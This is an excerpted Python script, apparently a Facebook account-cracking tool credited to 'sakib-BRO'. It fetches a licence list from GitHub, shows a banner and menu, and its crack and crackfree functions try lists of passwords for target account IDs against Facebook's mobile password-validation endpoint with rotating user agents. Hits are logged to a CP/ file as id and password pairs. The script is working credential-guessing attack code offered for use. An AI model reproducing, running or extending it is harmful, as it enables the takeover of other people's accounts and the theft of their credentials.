...
prinCP=[]
try:
    prox= requests.get('https://github.com/Sakib051325/All-approved-/blob/main/All%20approved').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Sakib051325/All-approved-/blob/main/All%20approved').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://facebook.com/groups/1971604019888428//?ref=share')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38msakib-BRO ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • sakib360       ║  \033[1;97m  
╠══[Github                   • \33[1;38mAsakib008 ║\33[1;34m   
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Sakib051325/All-approved-/blob/main/All%20approved').text
    if id in httpCaht:
      print(fuckyoursali)
...
while attemps < 12345677901:
    ...
    if username == 'almin' and password == 'almin2':
...
def login():
    try:
        ...
        try:
            sy = requests.get('htt//www.facebook.com/profile.php?id=100065335384166=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
...
def menu():
    ...
    if ASIF in ['111']:
        ...
        os.system('xdg-open https://github.com/Sakib051325/All-approved-/blob/main/All%20approved')
        os.system("python nono.py")
    elif ASIF in ['3','03']:
        result()
    elif ASIF in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[sakib-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[sakib-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92msakib-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
